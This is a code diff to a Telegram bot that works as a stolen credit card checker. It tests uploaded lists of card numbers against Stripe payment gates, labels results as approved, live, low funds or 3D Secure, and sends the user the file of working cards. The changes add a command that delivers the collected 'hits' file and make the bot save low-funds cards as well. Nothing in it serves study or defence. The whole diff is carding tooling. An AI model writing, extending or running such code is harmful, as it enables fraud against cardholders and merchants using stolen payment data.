@@ -14,7 +14,7 @@ bot = telebot.TeleBot(token, parse_mode="HTML")
 ALLOWED_IDS = ['1915369904', '7103090839']
 
 # ==========================================
-# 🔥 DOUBLE CHECK FUNCTION (UPDATED WITH 3DS)
+# 🔥 DOUBLE CHECK FUNCTION
 # ==========================================
 def check_double_gate(cc):
     # -------------------------------------
@@ -83,6 +83,18 @@ def start(message):
     if str(message.chat.id) not in ALLOWED_IDS: return
     bot.reply_to(message, "Send your Combo File! 🚀")
 
+# 🔥 COMMAND: GET LIVES FILE (/gfemin)
+@bot.message_handler(commands=["gfemin"])
+def send_hits_file(message):
+    if str(message.chat.id) not in ALLOWED_IDS: return
+    try:
+        doc = open("cc.txt", "rb")
+        bot.send_document(message.chat.id, doc, caption="<b>✅ Here are your Hits (Approved + Low Funds)</b>")
+    except FileNotFoundError:
+        bot.reply_to(message, "⚠️ No hits found yet!")
+    except Exception as e:
+        bot.reply_to(message, f"Error: {e}")
+
 @bot.message_handler(content_types=["document"])
 def main(message):
     if str(message.chat.id) not in ALLOWED_IDS: return
@@ -90,7 +102,7 @@ def main(message):
     t.start()
 
 # ==========================================
-# 🚀 CHECKER LOGIC (WITH 3DS HANDLING)
+# 🚀 CHECKER LOGIC
 # ==========================================
 def run_checker(message):
     dd = 0; live = 0; ch = 0; ccn = 0; cvv = 0; lowfund = 0; threeds = 0
@@ -134,26 +146,22 @@ def run_checker(message):
                 
                 print(f"{cc} -> {last}")
 
-                # Determine Gate Name
-                if "Gate 1" in last:
-                    gate_display = "Stripe 0.5$"
-                elif "Gate 2" in last:
-                    gate_display = "Stripe 0.7$"
-                else:
-                    gate_display = "Auth / Charge"
+                if "Gate 1" in last: gate_display = "Stripe 0.5$"
+                elif "Gate 2" in last: gate_display = "Stripe 0.7$"
+                else: gate_display = "Auth / Charge"
 
                 # ---------------------------------------------
-                # 🟢 RESULT MESSAGES
+                # 🟢 RESULT MESSAGES (COMPACT LAYOUT)
                 # ---------------------------------------------
                 
                 # 1. APPROVED / CHARGED
                 if 'Successful' in last:
                     ch += 1
-                    with open("lives.txt", "a") as f: f.write(f"{cc} - {last}\n")
+                    with open("cc.txt", "a") as f: f.write(f"{cc} - {last}\n")
                     
                     msg = f'''💀 <b>HIT DETECTED</b> 💀
 ━━━━━━━━━━━━━━
-🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+• <code>{cc}</code>
 🩸 <b>Response:</b> APPROVED! 🔥
 ━━━━━━━━━━━━━━
 🕸 <b>Type:</b> {brand} - {card_type}
@@ -170,7 +178,7 @@ def run_checker(message):
                     ccn += 1
                     msg = f'''💀 <b>HIT DETECTED</b> 💀
 ━━━━━━━━━━━━━━
-🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+• <code>{cc}</code>
 🩸 <b>Response:</b> CCN LIVE ✅
 ━━━━━━━━━━━━━━
 🕸 <b>Type:</b> {brand} - {card_type}
@@ -185,9 +193,11 @@ def run_checker(message):
                 # 3. LOW FUNDS
                 elif 'funds' in last:
                     lowfund += 1
+                    with open("cc.txt", "a") as f: f.write(f"{cc} - {last}\n")
+
                     msg = f'''💀 <b>HIT DETECTED</b> 💀
 ━━━━━━━━━━━━━━
-🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+• <code>{cc}</code>
 🩸 <b>Response:</b> LOW FUNDS 💰
 ━━━━━━━━━━━━━━
 🕸 <b>Type:</b> {brand} - {card_type}
@@ -199,12 +209,12 @@ def run_checker(message):
 👤 <b>Dev: @Rusisvirus</b>'''
                     bot.send_message(message.chat.id, msg)
 
-                # 4. 3D SECURE (NEW 🔥)
+                # 4. 3D SECURE
                 elif '3Ds' in last or 'authenticate' in last:
                     threeds += 1
                     msg = f'''🔐 <b>3D SECURE REQUIRED</b> 🔐
 ━━━━━━━━━━━━━━
-🏴‍☠️ <b>CC:</b> <code>{cc}</code>
+• <code>{cc}</code>
 🩸 <b>Response:</b> 3Ds / OTP REQUESTED 📱
 ━━━━━━━━━━━━━━
 🕸 <b>Type:</b> {brand} - {card_type}
